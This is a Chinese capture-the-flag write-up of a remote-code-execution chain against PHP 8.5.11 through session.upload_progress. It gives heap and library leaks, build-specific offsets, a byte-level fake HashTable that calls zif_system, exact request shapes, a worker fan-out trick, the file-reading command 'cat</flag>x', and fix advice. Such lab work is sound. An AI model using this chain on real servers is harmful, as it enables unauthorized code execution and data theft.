# Deck of Relics

```
> TPCTF 2026 · web · 挑战 ID `AUTHORED-C7823C52` · 状态 solved
```

## 一句话

A small museum catalog served by a house of eight attendants.

## 附件

| 文件 | 大小 | sha256 |
| --- | --- | --- |
| `AUTHORED-C7823C52.zip` | 4.5 KB | `8dae175f8669…` |
| `zip/README.txt` | 383 B | `55b5b18d752a…` |
| `zip/docker-compose.yml` | 993 B | `c203c011c0ff…` |
| `zip/Dockerfile` | 679 B | `200e60d62d07…` |
| `zip/php/zz-app.ini` | 563 B | `8b7dca29f203…` |
| `zip/apache/mpm_prefork.conf` | 424 B | `8474ee8fac52…` |
| `zip/public/relic.php` | 1.7 KB | `c3b6a9447b23…` |
| `zip/public/healthz.php` | 53 B | `413028219766…` |
| `zip/public/status.php` | 410 B | `ddba5185daa6…` |
| `zip/public/index.php` | 1.3 KB | `2dd91f5c6bf9…` |

## 分析与利用

FLAG：«FLAG»

分值：动态计分

### 0. TL;DR

题目给的是一个「没有任何洞」的 PHP 站点：没有 include、没有写文件、没有反序列化。真正的漏洞在 PHP 8.5.11 本体——session.upload_progress 在请求 RINIT 之前就建立session 状态，multipart 解析中途 OOM bailout 时漏掉清理，留下悬空的 PS(id)：

1. stage 1 用一次 OOM 请求 + 下一次请求，从 Set-Cookie 里泄露 Zend MM chunk 基址；
2. stage 2 换一种堆形状，泄露 libphp.so 基址；
3. stage 3 把伪造的 HashTable/引用精确落到陈旧的 session 数组上， session 关闭时 zval_ptr_dtor(&PS(http_session_vars)) 调到 pDestructor = zif_system， 命令 cat</flag>x 写进 /var/www/html/x（mod_php 的 cwd 就是 docroot），GET /x 取回 flag。

Apache prefork 固定 8 个 worker 且 KeepAlive Off，上游的 --pin-workers 用不了；我们最后没有钉 worker，而是利用 prefork 空闲队列的轮转做 fan-out：大请求 A 打完的那个child 会排到队尾，之后连发 B，第 ~8 个请求必然落回它身上。

### 1. 题目与附件

附件 AUTHORED-C7823C52.zip 就是完整源码，README.txt 明说「Nothing is hidden」。

chal_c7823c52/

├── Dockerfile

├── apache/mpm_prefork.conf

├── php/zz-app.ini

├── docker-compose.yml

```
├── public/{index.php,relic.php,status.php,healthz.php}
```

└── README.txt

**1.1 镜像**

FROM php:8.5.11-apache

COPY apache/mpm_prefork.conf /etc/apache2/mods-available/mpm_prefork.conf

COPY php/zz-app.ini /usr/local/etc/php/conf.d/zz-app.ini

COPY public/ /var/www/html/

RUN chown -R www-data:www-data /var/www/html && chmod 755 /var/www/html

RUN ln -s /answers/flag /flag

EXPOSE 80

两个细节是后面利用的关键：

• 镜像基于 PHP 8.5.11（2026 年的 pre-auth RCE 出事版本）；
• /var/www/html 归 www-data 且可写 —— 给「拿到 RCE 之后怎么把 flag 带出来」留了路。

**1.2 Apache**

KeepAlive Off

StartServers 8

MinSpareServers 8

MaxSpareServers 8

ServerLimit 8

MaxRequestWorkers 8

MaxConnectionsPerChild 0

固定 8 个 prefork child、不回收、不支持 keep-alive，且「collapse 的 attendant 会被同位置的新 hire 替换」——这正是题面里八个 attendants 的设定。

**1.3 PHP**

```
display_errors = On
display_startup_errors = On
error_reporting = E_ALL
memory_limit = 16M
post_max_size = 32M
upload_max_filesize = 32M
session.save_path = /tmp
session.use_strict_mode = 0
session.use_cookies = 1
session.upload_progress.enabled = On
session.upload_progress.cleanup = On
```

session.upload_progress.enabled=On、use_strict_mode=0、post_max_size >= memory_limit + 12M、display_errors=On —— 这份 ini 就是 php2shell 利用链要求的「baseline」，题面把它原样摆了出来。

**1.4 站点**

relic.php 只有三段 flavor 文本，index.php 是静态画廊，status.php 回显attendant=<getmypid()>，healthz.php 回 ok。应用层没有任何可利用点。

三段 flavor 其实是提示：

| Relic | 提示 | 对应 |
| --- | --- | --- |
| #1 intake ledger | 交付以 multipart 到达，RFC 1867 在脚本被调用之前就写好 progress 记录 | session.upload_progress 在 RINIT 前建 session |
| #2 attendants' rota | 固定 8 人；一条 client line 上的人负责整个请求；新连接谁先抢到谁接；collapse 的人会被替换 | prefork 队列/worker 固定 |
| #3 keepsake tokens | 可以自带 session token；结算时「keepsake」从回包里递回；attendants 公开诊断 | Set-Cookie 回显 + display_errors=On |

### 2. 漏洞：session.upload_progress 的 pre-RINIT 状态

这是 2026 年公开的 php2shell 链（CVE-2026-109618 / CVE-2026-109619）。要点：

• 带文件上传的 multipart 请求会让 SAPI 在 脚本 RINIT 之前触发 MULTIPART_EVENT_START，由 Session 模块执行 php_rinit_session(0)：分配/初始化 一份 session 状态，并发布 PS(id)。
• 如果解析器随后因 内存超限（memory_limit）在解析中途 bailout，这条路径会跳过 multipart end 对应的 cleanup —— Session 模块里就留下了指向已释放/半初始化内存的 PS(id) 等字段。
• 下一次请求（同一 child！）如果再次触发 session 初始化，会复用这个陈旧状态， 于是：
• Set-Cookie: PHPSESSID=... 里被塞进堆指针（stage 1）；
• 换一种堆形状，Set-Cookie 前 16 字节变成 nNextFreeElement|pDestructor， pDestructor 就是 libphp 里的 ZVAL_PTR_DTOR（stage 2）；
• 把伪造的 HashTable 落到陈旧 session 数组上，session 关闭时 zval_ptr_dtor(&PS(http_session_vars)) 就会以 pDestructor = zif_system 调用 一个伪造的 zend_string 命令（stage 3）。

前提：post_max_size 必须够大。比 post_max_size 还大的 body 在解析前就被拒掉，不会 OOM、不会漏、也不会报错——所以题目给了 post_max_size=32M、memory_limit=16M。

**2.1 三个 stage 的目标**

| stage | 泄露/利用 | 输出 |
| --- | --- | --- |
| 1 | Zend MM chunk 基址（2MB 对齐） | chunk = 0x72ac1c600000 |
| 2 | libphp.so 基址（4KB 对齐） | libphp = 0x72ac19000000 |
| 3 | 控制流 → zif_system(cmd) | /var/www/html/x |

**2.2 本 build 的偏移（php:8.5.11-apache, amd64, 16M/32M）**

zif_system        = 0x5996e0     # libphp 里

ZVAL_PTR_DTOR     = 0x7b47a0     # libphp 里

htdata            = chunk + 0xB3018   # stage 3 的伪造 HashTable 落点

0xB3018 不是通用常数，是按这套 A 请求（pads 6×(31,31) + file + 12MB big）的分配形状校准出来的：session 变量数组正好落在 chunk+0xB3018。

### 3. 八个 attendant 的问题：钉 worker 会把自己钉死

陈旧的 PS(id) 是 per-process 的：stage 1 的 A（OOM）和 B（取泄露）必须落在同一个 child 上。上游脚本用 --pin-workers（keep-alive 让一个连接占住 worker），但本题 KeepAlive Off，这条方案直接作废。

我们的第一版是 BodyPins：开 N-1 个只发一半 body 的慢速 multipart 请求，把其余 child全部占住，只留一个空闲 child 给 solver 用。本地 8 worker 的 lab 上完美工作；到远程却翻车：

1. 远程池子根本不是 8 个。OOM 请求会打崩 child，prefork 立刻补一个新的（pid 变）， 实测池子只有 6–7 个：{17,18,19,21,22,24} → {18,19,20,22,24,314} …
2. 于是「钉住 N-1 个」在池子不足时会把所有 child 占满：探针超时、solver 请求排队、 最后被任意一个干净 child 接走 → stage 1 永远拿不到泄露。
3. 更糟的是整台实例会被打到全忙十几分钟（连接都卡在 listen backlog 里）， 期间 curl 全是 000。

**3.1 换思路：不钉了，fan-out**

prefork 分派空闲 child 用的是 空闲队列 + 轮转：刚服务完 A 的那个 child 回到队列尾部。也就是说，A 之后连续发 B，前面 pool_size-1 个 B 会被别的 child 接走，第 pool_size 个 B 就落回被 arm 的那个 child。

于是 stage 的流程变成：

A (OOM, 留下陈旧 session 状态)  →  B, B, B, ... （连发 fan 次，不等待）

• 不需要持有任何连接 → 不会饿死池子、不会把实例卡死；
• 打到干净 child 的 B 只是普普通通建个 session，完全无害；
• 命中时该 child 的响应就是泄露（stage 1/2）或 RCE 触发（stage 3，连接直接断，返回 0 字节）。

本地/远程实测命中位置：

| 环境 | stage1 | stage2 | stage3 |
| --- | --- | --- | --- |
| 本地 deck-real（8 worker，真镜像） | B[7] | B[7] | B[6]（0 字节） |
| 远程实例（6–7 worker） | B[0]–B[4] | B[6] | B[6]（0 字节） |

### 4. 完整利用链

**4.1 stage 1：堆泄露**

A 请求（发给 /relic.php?id=1，任何 PHP 页面都行）：

1001 个字段 p0000..p1000（1 字节）   ← 触发 max_input_vars 警告

PHPSESSID = "\x00"                  ← 单字节 id

```
PHP_SESSION_UPLOAD_PROGRESS = "pwn"
```

f (file, filename=a.txt, 64 字节)

big = 10~12 MB 的 'B'               ← 把解析器打过 memory_limit

响应是 668 字节的 OOM 页：

<br />

<b>Warning</b>:  PHP Request Startup: Input variables exceeded 1000 ...

<b>Fatal error</b>:  Allowed memory size of 16777216 bytes exhausted ...

B 请求（93,685 字节）：PHPSESSID=<attacksessionid0001> + 841 个 48 字节字段 + 一个79 字节的 forge 字段（forge[0x10:0x18] = 0x1000、forge[0x18] = 'L'）。落在 armed child 上时，响应体 ~12–13 KB，Set-Cookie 变成 4096 字节：

Set-Cookie: PHPSESSID=LAAAA...%A0p%AA%C3%83%08w%00%00...

解码后在这一串里对 8 字节滑窗取「2MB 对齐值的众数」：

```
for i in range(len(raw) - 8):
v = int.from_bytes(raw[i:i+8], "little")
if 0x600000000000 <= v < 0x800000000000:      # 本平台映射区间
```

cnt[v & ~0x1FFFFF] += 1

chunk = cnt.most_common(1)[0][0]                  # 计数 >= 8 才认

得到 chunk = 0x72ac1c600000。注意 prefork 的 child 都 fork 自同一个父进程，ASLR 布局完全一致——所以这个基址对所有 attendant 都成立，跨 child 也能用。

**4.2 stage 2：libphp 泄露**

同样两步，只是把堆形状换成 1001 个 39 字节字段、B 换成 983 个aNNNN[j] 数组字段（i == 406 时 16 个、值长 16）。命中时 Set-Cookie 前 16 字节是nNextFreeElement|pDestructor：

```
p = int.from_bytes(cookie[8:16], "little")
```

assert p & 0xFFF == DTOR_OFFSET & 0xFFF

```
libphp = p - 0x7b47a0
```

得到 libphp = 0x72ac19000000。

**4.3 stage 3：伪造 HashTable → zif_system**

A 请求（12,584,151 字节）用真实 session id 形状：

```
PHPSESSID = "a"*19
PHP_SESSION_UPLOAD_PROGRESS = "p"*3
```

6 个 pad：name = "p" + 30 位数字（截 31），data = 31 个 'V'

f (file) + big (12 MB)

并且额外带 Cookie: PHPSESSID=aaaa...（32 个 a），让这条请求的 PS(id) 有效——否则 B 初始化时会往 R0+16 写 Set-Cookie，把伪造的 val.type 覆盖掉。

B 请求（96,344 字节）：

• 899 个 carrier 字段 cNNNN，39 字节，offset 8 起塞 24 字节的伪造引用：

1, 0x1A          # gc: rc=1, IS_REFERENCE

htdata, 0x307    # val.value = htdata, type = IS_ARRAY_EX

• 15 份 167 字节的伪造 HashTable hNNNN（h[0xB0:0xB8] = "HT%04d" 做标记）：

0x00  gc: rc=1, IS_ARRAY(7)

0x08  flags=0x10 | nTableMask=0xFFFFFFF8

0x10  arData = htdata + 0x20

0x18  nNumUsed = 1 | nNumOfElements = 1

0x20  nTableSize = 8 | misc = 0

0x28  nNextFreeElement = 0

0x30  pDestructor = zif_system          ← 关键

0x20  fake execute_data：

+0x10 return_value = zif_system

+0x2C num_args = 1

+0x50 arg1.value = htdata + 0x80

+0x58 arg1.type  = IS_STRING(6)

0x80  fake zend_string：

```
rc=1 | type=IS_STRING(0x106)
```

+0x10 len = len(cmd)

+0x18 cmd bytes + NUL

• 最后再补一个 PHP_SESSION_UPLOAD_PROGRESS=pwn。

B 落到 armed child 上时，session shutdown 走 zval_ptr_dtor(&PS(http_session_vars))，pDestructor 被当成函数指针调用 → zif_system("cat</flag>x")。这条连接会直接断掉（客户端看到 0 字节响应），但命令已经执行。

**4.4 把 flag 带出来**

mod_php 的 worker cwd 就是 /var/www/html（本地用 cwd.php 验证过：/var/www/html|apache2handler|<pid>），而 docroot 对 www-data 可写。于是 11 字节的命令cat</flag>x（/flag 是 ln -s /answers/flag /flag）直接把 flag 写成静态文件：

GET /x  →  HTTP/1.1 200 OK

Content-Length: 38

«FLAG»

### 5. 远程环境上的两个坑

**5.1 实例被平台换掉**

打到一半时，原实例 a177262c-…（172.16.197.0/24）整个网段失联——平台把它换成了e79c622f-…（{{INSTANCE_HOST}}，172.16.145.0/24，endpoint {{WG_ENDPOINT}}）。旧 WireGuard 隧道全部作废。

**5.2 没有管理员权限装隧道**

wireguard.exe /installtunnelservice 需要提权，而拿到手的 shell 是普通用户（IsInRole(Administrator) == False）。

绕法：用 userspace 的 WireGuard 实现——wireproxy（单文件，内置 gVisor netstack，不需要驱动/管理员），把它配成 SOCKS5：

[Interface]

```
Address = 172.16.145.254/32
PrivateKey = {{WG_PRIVATE_KEY}}
```

[Peer]

```
PublicKey = iBBDZdpTY/4WGNV6q//t6AqfhbvOShe2YzWTctHhtWo=
Endpoint = {{WG_ENDPOINT}}
AllowedIPs = 172.16.145.0/24
PersistentKeepalive = 25
```

[Socks5]

```
BindAddress = 127.0.0.1:25345
```

再写一个 30 行的本地 TCP→SOCKS5 转发器（_dl/socks_forward.py），把127.0.0.1:18400 映射到 172.16.145.2:80，exploit 一行不改直接打http://127.0.0.1:18400/relic.php。

**5.3 链路抖动 → 分阶段、可续跑**

远程链路 100–800 KB/s 且会突然卡住（一次 12MB 上传有时 15s，有时 240s 超时）。于是把链拆成三个阶段、状态存 JSON（deck/fan_stage.py）：

```bash
python fan_stage.py http://127.0.0.1:18400/relic.php --stage 1 --state st.json
```

# → OK chunk=0x72ac1c600000

```bash
python fan_stage.py http://127.0.0.1:18400/relic.php --stage 2 --state st.json
```

# → OK libphp=0x72ac19000000

```bash
python fan_stage.py http://127.0.0.1:18400/relic.php --stage 3 --state st.json --cmd 'cat</flag>x'
```

# → PROOF b'«FLAG»'

每个 stage 失败只重跑自己，不用从头再传 30MB。

### 6. 复现步骤

**6.1 本地（真镜像）**

docker build -t deck-real chal_c7823c52

docker run -d --name deck-real -p 18310:80 \

-v "$PWD/chal_c7823c52/localflag/flag:/answers/flag:ro" deck-real

```bash
python deck/fan_chain.py http://127.0.0.1:18310/relic.php --fan 8 --cmd 'cat</flag>x'
curl http://127.0.0.1:18310/x
```

**6.2 远程**

wireproxy.exe -c _dl/wp_deck.conf &                    # SOCKS5 127.0.0.1:25345

```bash
python _dl/socks_forward.py --listen 127.0.0.1:18400 \
```

--socks 127.0.0.1:25345 --target 172.16.145.2:80 &

```bash
python deck/fan_stage.py http://127.0.0.1:18400/relic.php --stage 1 --state st.json
python deck/fan_stage.py http://127.0.0.1:18400/relic.php --stage 2 --state st.json
python deck/fan_stage.py http://127.0.0.1:18400/relic.php --stage 3 --state st.json --cmd 'cat</flag>x'
```

### 7. 修复建议

1. 升级 PHP：官方修复把 Session 的 reinit 从 multipart 的 file-start 回调挪到 MULTIPART_EVENT_START，并在 bailout 路径上补齐 cleanup——8.5.11 之后的版本不再有这条链。
2. 不用上传进度条就别开 session.upload_progress.enabled； session.use_strict_mode=1 也能提高门槛。
3. 别把 post_max_size 放到 memory_limit + 12M 这种「刚好够 OOM」的区间； 更重要的是 display_errors=Off（本题为演示需要才打开）。
4. 不要把 flag 的可见性交给「应用里没有读文件原语」这种假设： docroot 对 www-data 可写 + cwd 在 docroot，等于给任何 RCE 修好了外带通道。 flag 放在 /answers 只读卷是对的，但 worker 的 cwd 不该可写。

### 8. 附录：文件与偏移

chal_c7823c52/                    题目源码（原样）

deck/fan_stage.py                 分阶段 fan-out（状态文件、可续跑）  ← 打远程用这个

deck/fan_chain.py                 本地一键全链

deck/fanout.py                    A/B body 构造

deck/FLAG.txt                     拿到的 flag

_dl/socks_forward.py              本地 TCP → SOCKS5 转发

_dl/wp_deck.conf                  wireproxy 配置（新实例）

_dl/wireproxy.exe                 userspace WireGuard（无需管理员）

```
zif_system      = 0x5996e0
ZVAL_PTR_DTOR   = 0x7b47a0
htdata          = chunk + 0xB3018
```

stage1 A/B      12,655,437 B (huge 12) / 93,685 B

stage2 A/B      12,693,475 B (huge 12) / 83,032 B

stage3 A/B      12,584,151 B / 96,344 B

实测 chunk      = 0x72ac1c600000

实测 libphp     = 0x72ac19000000

## 结果

- flag sha256：`1716cf69dbeae554ba1e73e63515ff96b18e994469ac9fb0a2bd3140bef9d828`, `45152bbbb4fcb02fd0698ca742a3ded9482ddbfaad62803c334180e86126b1e5`
- 明文 flag 不入库；提交记录见 `.ctf-submissions.jsonl` 或原始 WP。

## 脚本

- `solve/WRITEUP.md`

## 待核实

- 本条目由 WP 第 10 节《Deck of Relics》与平台附件自动合成，建议人工复核 summary 与 fingerprints。
